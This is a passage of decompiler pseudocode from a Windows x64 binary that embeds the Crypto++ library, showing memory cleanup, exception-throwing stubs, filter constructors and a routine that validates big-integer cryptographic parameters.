      v30 = si128.m128i_i64[1] + 40;
      v31 = *(_QWORD *)(v41.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v41.m128i_i64[0] - v31 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v31, v30);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F128060) ----------------------------------------------------
void __noreturn sub_13F128060()
{
  __m128i v0[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  sub_13F1053B0(v0, (const __m128i *)"PK_MessageAccumulator: TruncatedFinal() should not be called");
  sub_13F101660((__int64)pExceptionObject, v0);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 13F128060: using guessed type __m128i var_80[2];

//----- (000000013F1280C0) ----------------------------------------------------
__int64 __fastcall sub_13F1280C0(_BYTE *a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 result; // rax

  v6 = (*(__int64 (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 152i64))(a1);
  result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 32i64))(v6, a2, a3);
  a1[232] = a1[232] && !a3;
  return result;
}

//----- (000000013F128130) ----------------------------------------------------
bool __fastcall sub_13F128130(__int64 a1, __int64 a2, unsigned int a3)
{
  int v5; // esi
  __int64 (__fastcall *(**v6)[4])(); // rax
  __int64 (__fastcall *(**v7)[4])(); // rax
  __int64 (__fastcall *(**v8)[4])(); // rax
  __int64 v9; // r15
  __int64 (__fastcall *(**v10)[4])(); // rax
  __int64 (__fastcall *(**v11)[4])(); // rax
  __int64 (__fastcall *(**v12)[4])(); // rax
  __int64 (__fastcall *(**v13)[4])(); // rax
  bool v14; // bl
  bool v15; // bl
  unsigned __int64 v16; // rcx
  __int64 v17; // rdx
  __int64 v18; // rdi
  char v19; // bl
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v22; // rcx
  __int64 v23; // rdx
  unsigned __int64 v24; // rcx
  __int64 v25; // rdx
  unsigned __int64 v26; // rcx
  __int64 v27; // rdx
  unsigned __int64 v28; // rcx
  __int64 v29; // rdx
  unsigned __int64 v30; // rcx
  __int64 v31; // rdx
  unsigned __int64 v32; // rcx
  __int64 v33; // rdx
  unsigned __int64 v34; // rcx
  __int64 v35; // rdx
  int v36; // edi
  char v37; // bl
  unsigned __int64 v38; // rcx
  __int64 v39; // rdx
  unsigned __int64 v40; // rcx
  __int64 v41; // rdx
  unsigned __int64 v42; // rcx
  __int64 v43; // rdx
  unsigned __int64 v44; // rcx
  __int64 v45; // rdx
  unsigned __int64 v46; // rcx
  __int64 v47; // rdx
  unsigned __int64 v48; // rcx
  __int64 v49; // r8
  unsigned __int64 v50; // rcx
  __int64 v51; // rdx
  unsigned __int64 v52; // rcx
  __int64 v53; // rdx
  unsigned __int64 v54; // rcx
  __int64 v55; // rdx
  char v57[16]; // [rsp+20h] [rbp-E0h] BYREF
  unsigned __int64 v58; // [rsp+30h] [rbp-D0h]
  unsigned __int64 v59; // [rsp+38h] [rbp-C8h]
  void *v60; // [rsp+40h] [rbp-C0h]
  char v61[16]; // [rsp+50h] [rbp-B0h] BYREF
  unsigned __int64 v62; // [rsp+60h] [rbp-A0h]
  unsigned __int64 v63; // [rsp+68h] [rbp-98h]
  void *v64; // [rsp+70h] [rbp-90h]
  char v65[16]; // [rsp+80h] [rbp-80h] BYREF
  unsigned __int64 v66; // [rsp+90h] [rbp-70h]
  unsigned __int64 v67; // [rsp+98h] [rbp-68h]
  void *v68; // [rsp+A0h] [rbp-60h]
  char v69[16]; // [rsp+B0h] [rbp-50h] BYREF
  unsigned __int64 v70; // [rsp+C0h] [rbp-40h]
  unsigned __int64 v71; // [rsp+C8h] [rbp-38h]
  void *v72; // [rsp+D0h] [rbp-30h]
  char v73[16]; // [rsp+E0h] [rbp-20h] BYREF
  unsigned __int64 v74; // [rsp+F0h] [rbp-10h]
  unsigned __int64 v75; // [rsp+F8h] [rbp-8h]
  void *v76; // [rsp+100h] [rbp+0h]
  char v77[16]; // [rsp+110h] [rbp+10h] BYREF
  unsigned __int64 v78; // [rsp+120h] [rbp+20h]
  unsigned __int64 v79; // [rsp+128h] [rbp+28h]
  void *v80; // [rsp+130h] [rbp+30h]
  char v81[16]; // [rsp+140h] [rbp+40h] BYREF
  unsigned __int64 v82; // [rsp+150h] [rbp+50h]
  unsigned __int64 v83; // [rsp+158h] [rbp+58h]
  void *v84; // [rsp+160h] [rbp+60h]
  __int64 v85; // [rsp+170h] [rbp+70h]
  char v86[8]; // [rsp+178h] [rbp+78h] BYREF
  unsigned __int64 v87; // [rsp+188h] [rbp+88h]
  unsigned __int64 v88; // [rsp+190h] [rbp+90h]
  void *v89; // [rsp+198h] [rbp+98h]

  v85 = -2i64;
  v5 = 0;
  v6 = sub_13F120160();
  if ( (int)sub_13F11C520(a1 - 496, (__int64)v6) > 0
    && sub_13F11EB30(a1 - 496, 0i64) == 1
    && (v7 = sub_13F120160(), (int)sub_13F11C520(a1 - 448, (__int64)v7) > 0)
    && sub_13F11EB30(a1 - 448, 0i64) == 1
    && (int)sub_13F11C520(a1 - 448, a1 - 496) < 0
    && (v8 = sub_13F120160(), v9 = a1 - 240, (int)sub_13F11C520(a1 - 240, (__int64)v8) > 0)
    && sub_13F11EB30(a1 - 240, 0i64) == 1
    && (int)sub_13F11C520(a1 - 240, a1 - 496) < 0
    && (v10 = sub_13F120160(), (int)sub_13F11C520(a1 - 192, (__int64)v10) > 0)
    && sub_13F11EB30(a1 - 192, 0i64) == 1
    && (int)sub_13F11C520(a1 - 192, a1 - 496) < 0
    && (v11 = sub_13F120160(), (int)sub_13F11C520(a1 - 288, (__int64)v11) > 0)
    && sub_13F11EB30(a1 - 288, 0i64) == 1
    && (int)sub_13F11C520(a1 - 288, a1 - 496) < 0
    && (v12 = sub_13F120160(), (int)sub_13F11C520(a1 - 144, (__int64)v12) > 0)
    && sub_13F11EB30(a1 - 144, 0i64) == 1
    && (int)sub_13F11C520(a1 - 144, a1 - 240) < 0
    && (v13 = sub_13F120160(), (int)sub_13F11C520(a1 - 96, (__int64)v13) > 0)
    && sub_13F11EB30(a1 - 96, 0i64) == 1
    && (int)sub_13F11C520(a1 - 96, a1 - 192) < 0
    && *(_DWORD *)(a1 - 48 + 40) != 1
    && !sub_13F113630(a1 - 48)
    && (int)sub_13F11C520(a1 - 48, a1 - 240) < 0 )
  {
    v14 = 1;
  }
  else
  {
    v14 = 0;
    v9 = a1 - 240;
  }
  if ( a3 )
  {
    v15 = 0;
    if ( v14 )
    {
      sub_13F1234E0(v9, (__int64)v69, a1 - 192);
      v5 = 262145;
      if ( !(unsigned int)sub_13F11C520((__int64)v69, a1 - 496) )
        v15 = 1;
    }
    if ( (v5 & 1) != 0 )
    {
      v5 &= ~1u;
      v16 = v71;
      if ( v70 < v71 )
        v16 = v70;
      v17 = (__int64)v72;
      if ( v72 )
      {
        memset(v72, 0, 8 * v16);
        sub_13F12E4D0(v17);
      }
    }
    if ( !v15 )
      goto LABEL_39;
    sub_13F112AD0((__int64)v65, 1u);
    sub_13F112AD0((__int64)v61, 1u);
    sub_13F112AD0((__int64)v57, 1u);
    sub_13F11FBB0(a1 - 192, (__int64)v81, (__int64)v61);
    sub_13F11FBB0(v9, (__int64)v77, (__int64)v57);
    v18 = sub_13F1275D0((__int64)v86, (__int64)v77, (__int64)v81);
    sub_13F1234E0(a1 - 448, (__int64)v73, a1 - 288);
    sub_13F11FD00((__int64)v73, (__int64)v69, v18);
    v5 |= 0x7801FEu;
    if ( (unsigned int)sub_13F11C520((__int64)v69, (__int64)v65) )
LABEL_39:
      v19 = 0;
    else
      v19 = 1;
    if ( (v5 & 0x100) != 0 )
    {
      v5 &= ~0x100u;
      v20 = v71;
      if ( v70 < v71 )
        v20 = v70;
      v21 = (__int64)v72;
      if ( v72 )
      {
        memset(v72, 0, 8 * v20);
        sub_13F12E4D0(v21);
      }
    }
    if ( (v5 & 0x80u) != 0 )
    {
      v5 &= ~0x80u;
      v22 = v75;
      if ( v74 < v75 )
        v22 = v74;
      v23 = (__int64)v76;
      if ( v76 )
      {
        memset(v76, 0, 8 * v22);
        sub_13F12E4D0(v23);
      }
    }
    if ( (v5 & 0x40) != 0 )
    {
      v5 &= ~0x40u;
      v24 = v88;
      if ( v87 < v88 )
        v24 = v87;
      v25 = (__int64)v89;
      if ( v89 )
      {
        memset(v89, 0, 8 * v24);
        sub_13F12E4D0(v25);
      }
    }
    if ( (v5 & 0x20) != 0 )
    {
      v5 &= ~0x20u;
      v26 = v79;
      if ( v78 < v79 )
        v26 = v78;
      v27 = (__int64)v80;
      if ( v80 )
      {
        memset(v80, 0, 8 * v26);
        sub_13F12E4D0(v27);
      }
    }
    if ( (v5 & 0x10) != 0 )
    {
      v5 &= ~0x10u;
      v28 = v83;
      if ( v82 < v83 )
        v28 = v82;
      v29 = (__int64)v84;
      if ( v84 )
      {
        memset(v84, 0, 8 * v28);
        sub_13F12E4D0(v29);
      }
    }
    if ( (v5 & 8) != 0 )
    {
      v5 &= ~8u;
      v30 = v59;
      if ( v58 < v59 )
        v30 = v58;
      v31 = (__int64)v60;
      if ( v60 )
      {
        memset(v60, 0, 8 * v30);
        sub_13F12E4D0(v31);
      }
    }
    if ( (v5 & 4) != 0 )
    {
      v5 &= ~4u;
      v32 = v63;
      if ( v62 < v63 )
        v32 = v62;
      v33 = (__int64)v64;
      if ( v64 )
      {
        memset(v64, 0, 8 * v32);
        sub_13F12E4D0(v33);
      }
    }
    if ( (v5 & 2) != 0 )
    {
      v5 &= ~2u;
      v34 = v67;
      if ( v66 < v67 )
        v34 = v66;
      v35 = (__int64)v68;
      if ( v68 )
      {
        memset(v68, 0, 8 * v34);
        sub_13F12E4D0(v35);
      }
    }
    if ( !v19 )
      goto LABEL_84;
    sub_13F112AD0((__int64)v73, 1u);
    v36 = v5 | 0x200;
    sub_13F11FBB0(v9, (__int64)v77, (__int64)v73);
    sub_13F11FD00(a1 - 288, (__int64)v81, (__int64)v77);
    v5 |= 0x1800E00u;
    if ( (unsigned int)sub_13F11C520(a1 - 144, (__int64)v81)
      || (sub_13F112AD0((__int64)v57, 1u),
          sub_13F11FBB0(a1 - 192, (__int64)v61, (__int64)v57),
          sub_13F11FD00(a1 - 288, (__int64)v65, (__int64)v61),
          v5 = v36 | 0x7807C00,
          (unsigned int)sub_13F11C520(a1 - 96, (__int64)v65)) )
    {
LABEL_84:
      v37 = 0;
    }
    else
    {
      v37 = 1;
    }
    if ( (v5 & 0x4000) != 0 )
    {
      v5 &= ~0x4000u;
      v38 = v67;
      if ( v66 < v67 )
        v38 = v66;
      v39 = (__int64)v68;
      if ( v68 )
      {
        memset(v68, 0, 8 * v38);
        sub_13F12E4D0(v39);
      }
    }
    if ( (v5 & 0x2000) != 0 )
    {
      v5 &= ~0x2000u;
      v40 = v63;
      if ( v62 < v63 )
        v40 = v62;
      v41 = (__int64)v64;
      if ( v64 )
      {
        memset(v64, 0, 8 * v40);
        sub_13F12E4D0(v41);
      }
    }
    if ( (v5 & 0x1000) != 0 )
    {
      v5 &= ~0x1000u;
      v42 = v59;
      if ( v58 < v59 )
        v42 = v58;
      v43 = (__int64)v60;
      if ( v60 )
      {
        memset(v60, 0, 8 * v42);
        sub_13F12E4D0(v43);
      }
    }
    if ( (v5 & 0x800) != 0 )
    {
      v5 &= ~0x800u;
      v44 = v83;
      if ( v82 < v83 )
        v44 = v82;
      v45 = (__int64)v84;
      if ( v84 )
      {
        memset(v84, 0, 8 * v44);
        sub_13F12E4D0(v45);
      }
    }
    if ( (v5 & 0x400) != 0 )
    {
      v5 &= ~0x400u;
      v46 = v79;
      if ( v78 < v79 )
        v46 = v78;
      v47 = (__int64)v80;
      if ( v80 )
      {
        memset(v80, 0, 8 * v46);
        sub_13F12E4D0(v47);
      }
    }
    if ( (v5 & 0x200) != 0 )
    {
      v5 &= ~0x200u;
      v48 = v75;
      if ( v74 < v75 )
        v48 = v74;
      v49 = (__int64)v76;
      if ( v76 )
      {
        memset(v76, 0, 8 * v48);
        sub_13F12E4D0(v49);
      }
    }
    v14 = 0;
    if ( v37 )
    {
      sub_13F112AD0((__int64)v57, 1u);
      sub_13F1234E0(a1 - 48, (__int64)v61, a1 - 192);
      sub_13F11FD00((__int64)v61, (__int64)v65, v9);
      v5 |= 0x18038000u;
      if ( !(unsigned int)sub_13F11C520((__int64)v65, (__int64)v57) )
        v14 = 1;
    }
    if ( (v5 & 0x20000) != 0 )
    {
      v5 &= ~0x20000u;
      v50 = v67;
      if ( v66 < v67 )
        v50 = v66;
      v51 = (__int64)v68;
      if ( v68 )
      {
        memset(v68, 0, 8 * v50);
        sub_13F12E4D0(v51);
      }
    }
    if ( (v5 & 0x10000) != 0 )
    {
      v52 = v63;
      if ( v62 < v63 )
        v52 = v62;
      v53 = (__int64)v64;
      if ( v64 )
      {
        memset(v64, 0, 8 * v52);
        sub_13F12E4D0(v53);
      }
    }
    if ( (v5 & 0x8000) != 0 )
    {
      v54 = v59;
      if ( v58 < v59 )
        v54 = v58;
      v55 = (__int64)v60;
      if ( v60 )
      {
        memset(v60, 0, 8 * v54);
        sub_13F12E4D0(v55);
      }
    }
  }
  if ( a3 < 2 )
    return v14;
  return v14 && sub_13F139BE0(a2, v9, a3 - 2) && sub_13F139BE0(a2, a1 - 192, a3 - 2);
}
// 13F128130: using guessed type char var_68[8];

//----- (000000013F128A80) ----------------------------------------------------
bool __fastcall sub_13F128A80(__int64 a1)
{
  __int64 (__fastcall *(**v2)[4])(); // rax
  __int64 v3; // rdi
  __int64 (__fastcall *(**v4)[4])(); // rax
  __int64 v5; // rbx
  bool result; // al

  v2 = sub_13F120160();
  v3 = a1 - 96;
  result = 0;
  if ( (int)sub_13F11C520(a1 - 96, (__int64)v2) > 0 && sub_13F11EB30(a1 - 96, 0i64) == 1 )
  {
    v4 = sub_13F120160();
    v5 = a1 - 48;
    if ( (int)sub_13F11C520(v5, (__int64)v4) > 0 && sub_13F11EB30(v5, 0i64) == 1 && (int)sub_13F11C520(v5, v3) < 0 )
      return 1;
  }
  return result;
}

//----- (000000013F128B10) ----------------------------------------------------
_QWORD *__fastcall sub_13F128B10(_QWORD *a1)
{
  _QWORD *v2; // rax
  __int64 v3; // rcx
  unsigned __int64 v4; // rdx
  __int64 v5; // rcx
  unsigned __int64 v6; // rdx
  __int64 v7; // rcx
  unsigned __int64 v8; // rdx
  __int64 (__fastcall **v10)(); // [rsp+28h] [rbp-70h] BYREF
  __int64 v11; // [rsp+30h] [rbp-68h]
  __int128 v12; // [rsp+38h] [rbp-60h]
  __int64 v13; // [rsp+48h] [rbp-50h] BYREF
  __int64 v14; // [rsp+50h] [rbp-48h]
  __int64 v15; // [rsp+60h] [rbp-38h]
  __int64 v16; // [rsp+68h] [rbp-30h] BYREF
  __int64 v17; // [rsp+70h] [rbp-28h]
  __int64 v18; // [rsp+80h] [rbp-18h]

  v2 = sub_13F1237F0(&v10);
  sub_13F113A30(&v13, (__int64)v2, 113549);
  v10 = off_13F181EC8;
  v3 = v11;
  if ( v11 )
  {
    v4 = 4 * ((*((_QWORD *)&v12 + 1) - v11) >> 2);
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      v3 = *(_QWORD *)(v11 - 8);
      if ( (unsigned __int64)(v11 - v3 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v3, v4);
    v11 = 0i64;
    v12 = 0i64;
  }
  sub_13F113A30(&v16, (__int64)&v13, 1);
  v5 = v14;
  if ( v14 )
  {
    v6 = 4 * ((v15 - v14) >> 2);
    if ( v6 >= 0x1000 )
    {
      v6 += 39i64;
      v5 = *(_QWORD *)(v14 - 8);
      if ( (unsigned __int64)(v14 - v5 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v5, v6);
  }
  sub_13F113A30(a1, (__int64)&v16, 1);
  v7 = v17;
  if ( v17 )
  {
    v8 = (v18 - v17) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v8 >= 0x1000 )
    {
      v8 += 39i64;
      v7 = *(_QWORD *)(v17 - 8);
      if ( (unsigned __int64)(v17 - v7 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v7, v8);
  }
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F128C80) ----------------------------------------------------
_QWORD *__fastcall sub_13F128C80(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return a1;
}
// 13F186DD8: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';

//----- (000000013F128CB0) ----------------------------------------------------
__int64 __fastcall sub_13F128CB0(__int64 a1, const __m128i *a2)
{
  const __m128i *v2; // rsi
  const __m128i *v4; // rbp
  unsigned __int64 v5; // rbp
  __m128i v6; // kr00_16
  __m128i *v7; // rbx
  __m128i *v8; // rbx
  __m128i v9; // kr10_16
  __m128i *v10; // rbx
  __m128i *v11; // rbx
  __int64 v12; // rdx
  __int64 v13; // rcx
  __m128i v15; // [rsp+48h] [rbp-40h] BYREF
  __m128i si128; // [rsp+58h] [rbp-30h]

  v2 = a2;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v15.m128i_i8[0] = 0;
  v4 = a2 + 1;
  sub_13F106B80(&v15, a2[1].m128i_i64[0] + 54);
  if ( v2[1].m128i_i64[1] >= 0x10ui64 )
    v2 = (const __m128i *)v2->m128i_i64[0];
  v5 = v4->m128i_i64[0];
  v6 = si128;
  if ( v5 > si128.m128i_i64[1] - si128.m128i_i64[0] )
  {
    sub_13F107AD0(&v15, v5, 0i64, v2, v5);
  }
  else
  {
    si128.m128i_i64[0] += v5;
    v7 = &v15;
    if ( v6.m128i_i64[1] >= 0x10ui64 )
      v7 = (__m128i *)v15.m128i_i64[0];
    v8 = (__m128i *)((char *)v7 + v6.m128i_i64[0]);
    sub_13F15EB00(v8, v2, v5);
    v8->m128i_i8[v5] = 0;
  }
  v9 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 0x36ui64 )
  {
    sub_13F107AD0(
      &v15,
      0x36ui64,
      0i64,
      (const __m128i *)": Nonblocking input is not implemented by this object.",
      0x36ui64);
  }
  else
  {
    si128.m128i_i64[0] += 54i64;
    v10 = &v15;
    if ( v9.m128i_i64[1] >= 0x10ui64 )
      v10 = (__m128i *)v15.m128i_i64[0];
    v11 = (__m128i *)((char *)v10 + v9.m128i_i64[0]);
    sub_13F15EB00(v11, (const __m128i *)": Nonblocking input is not implemented by this object.", 0x36ui64);
    v11[3].m128i_i8[6] = 0;
  }
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 0;
  sub_13F1053F0((__m128i **)(a1 + 32), &v15);
  *(_QWORD *)a1 = off_13F181CD8;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v12 = si128.m128i_i64[1] + 1;
    v13 = v15.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v12 = si128.m128i_i64[1] + 40;
      v13 = *(_QWORD *)(v15.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v15.m128i_i64[0] - v13 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v13, v12);
  }
  *(_QWORD *)a1 = &CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();
// 13F186DD8: using guessed type void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F128E90) ----------------------------------------------------
__int64 __fastcall sub_13F128E90(__int64 a1, __int64 a2)
{
  sub_13F10EE30(a1, 0);
  *(_QWORD *)(a1 + 24) = a2;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)(a1 + 40) = 0;
  return a1;
}

//----- (000000013F128ED0) ----------------------------------------------------
__int64 __fastcall sub_13F128ED0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        char a4,
        int a5,
        const __m128i *a6,
        const __m128i *a7)
{
  int v11; // eax
  void (__fastcall ***v12)(_QWORD, __int64); // rcx

  sub_13F10EE30(a1, 0);
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 64) = -1i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_QWORD *)a1 = off_13F1827D0;
  *(_QWORD *)(a1 + 8) = off_13F182958;
  *(_QWORD *)(a1 + 48) = off_13F182978;
  *(_QWORD *)(a1 + 88) = a2;
  *(_BYTE *)(a1 + 96) = a4;
  *(_DWORD *)(a1 + 100) = 0;
  *(_QWORD *)(a1 + 104) = 0i64;
  sub_13F1053F0((__m128i **)(a1 + 112), a6);
  sub_13F1053F0((__m128i **)(a1 + 144), a7);
  v11 = a5;
  if ( a5 < 0 )
    v11 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 88) + 64i64))(*(_QWORD *)(a1 + 88));
  *(_DWORD *)(a1 + 100) = v11;
  v12 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(a1 + 24) = a3;
  return a1;
}
// 13F1827D0: using guessed type __int64 (__fastcall *off_13F1827D0[49])();
// 13F182958: using guessed type void *off_13F182958[4];
// 13F182978: using guessed type void *off_13F182978[2];

//----- (000000013F128FE0) ----------------------------------------------------
__int64 __fastcall sub_13F128FE0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v9; // r8
  __int64 v10; // rax
  __int64 v11; // rbx
  __m128i v13[2]; // [rsp+38h] [rbp-90h] BYREF
  char pExceptionObject[64]; // [rsp+60h] [rbp-68h] BYREF

  sub_13F10EE30(a1, 0);
  *(_QWORD *)(a1 + 24) = a5;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)a1 = &CryptoPP::FilterWithBufferedInput::`vftable';
  *(_QWORD *)(a1 + 8) = off_13F187018;
  *(_QWORD *)(a1 + 48) = a3;
  *(_QWORD *)(a1 + 56) = 1i64;
  *(_QWORD *)(a1 + 64) = a4;
  *(_BYTE *)(a1 + 72) = 0;
  *(_QWORD *)(a1 + 88) = -1i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  v9 = *(_QWORD *)(a1 + 48);
  if ( v9 == -1 || !*(_QWORD *)(a1 + 56) || *(_QWORD *)(a1 + 64) == -1i64 )
  {
    sub_13F1053B0(v13, (const __m128i *)"FilterWithBufferedInput: invalid buffer size");
    sub_13F101600((__int64)pExceptionObject, v13);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_13F12A810((_QWORD *)(a1 + 80), 1i64, v9);
  *(_QWORD *)a1 = off_13F1871C8;
  *(_QWORD *)(a1 + 8) = off_13F1873B8;
  *(_QWORD *)(a1 + 144) = a2;
  if ( a2 )
  {
    v10 = sub_13F14059C(40i64);
    v11 = v10;
    if ( v10 )
    {
      sub_13F10EE30(v10, 0);
      *(_QWORD *)v11 = off_13F187038;
      *(_QWORD *)(v11 + 8) = off_13F1871A8;
      *(_QWORD *)(v11 + 24) = a1;
      *(_BYTE *)(v11 + 32) = 0;
    }
    else
    {
      v11 = 0i64;
    }
    (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 144) + 352i64))(*(_QWORD *)(a1 + 144), v11);
  }
  return a1;
}
// 13F186E28: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 13F187018: using guessed type void *off_13F187018[4];
// 13F187038: using guessed type __int64 (__fastcall *off_13F187038[46])();
// 13F1871A8: using guessed type __int64 (__fastcall *off_13F1871A8[4])();
// 13F1871C8: using guessed type __int64 (__fastcall *off_13F1871C8[62])();
// 13F1873B8: using guessed type __int64 (__fastcall *off_13F1873B8[3])();
// 13F128FE0: using guessed type __m128i var_90[2];

//----- (000000013F129188) ----------------------------------------------------
_QWORD *__fastcall sub_13F129188(__int64 a1, char a2)
{
  return sub_13F1291A0((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F1291A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1291A0(_QWORD *a1, char a2)
{
  *a1 = off_13F187038;
  a1[1] = off_13F1871A8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 40i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F187038: using guessed type __int64 (__fastcall *off_13F187038[46])();
// 13F1871A8: using guessed type __int64 (__fastcall *off_13F1871A8[4])();

//----- (000000013F1291E0) ----------------------------------------------------
__int64 __fastcall sub_13F1291E0(_QWORD *a1)
{
  __int64 result; // rax
  __int64 v3; // rax
  void (__fastcall ***v4)(_QWORD, __int64); // rcx
  __int64 v5; // rdi

  result = a1[3];
  if ( !result )
  {
    v3 = (*(__int64 (**)(void))(*a1 + 360i64))();
    v4 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
    v5 = v3;
    if ( v4 )
      (**v4)(v4, 1i64);
    a1[3] = v5;
    return v5;
  }
  return result;
}

//----- (000000013F129230) ----------------------------------------------------
__int64 __fastcall sub_13F129230(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rax

  v5 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v5 + 272i64))(v5, a2, a3);
}

//----- (000000013F129270) ----------------------------------------------------
char __fastcall sub_13F129270(__int64 a1, __int64 a2, unsigned __int8 a3, unsigned int a4)
{
  __int64 v7; // rax

  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD))(*(_QWORD *)v7 + 296i64))(v7, a2, a3, a4);
}

//----- (000000013F1292E0) ----------------------------------------------------
char __fastcall sub_13F1292E0(__int64 a1, __int64 a2, unsigned int a3, unsigned __int8 a4)
{
  __int64 v7; // rax

  if ( !*(_BYTE *)(a1 + 32) )
    return 0;
  v7 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD))(*(_QWORD *)v7 + 304i64))(v7, a2, a3, a4);
}

//----- (000000013F129350) ----------------------------------------------------
__int64 __fastcall sub_13F129350(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, char a6)
{
  __int64 v9; // rax

  v9 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v9 + 280i64))(v9, a2, a3, a4);
}

//----- (000000013F1293D0) ----------------------------------------------------
__int64 __fastcall sub_13F1293D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, char a6)
{
  __int64 v9; // rax

  v9 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 24) + 336i64))(*(_QWORD *)(a1 + 24));
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v9 + 288i64))(v9, a2, a3, a4);
}

//----- (000000013F129450) ----------------------------------------------------
__int64 __fastcall sub_13F129450(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, char a6)
{
  __int64 v9; // rax

  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 328i64))(a1);
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v9 + 264i64))(v9, a2, a3, a4);
}

//----- (000000013F1294A0) ----------------------------------------------------
__int64 __fastcall sub_13F1294A0(_QWORD *a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5, char a6)
{
  unsigned __int64 v6; // rax
  unsigned __int64 v8; // r11
  unsigned __int64 v9; // rsi
  unsigned __int64 v10; // rax
  __int64 result; // rax

  v6 = a1[6];
  v8 = *a3 + a1[7];
  if ( v8 >= v6 )
    v8 = a1[6];
  v9 = a4 - *a3;
  v10 = v6 - v8;
  if ( v9 >= v10 )
    v9 = v10;
  result = (*(__int64 (__fastcall **)(__int64, __int64, unsigned __int64, unsigned __int64, _DWORD, char))(*(_QWORD *)a2 + 280i64))(
             a2,
             a5,
             v8 + a1[5],
             v9,
             0,
             a6);
  if ( !result )
    *a3 += v9;
  return result;
}

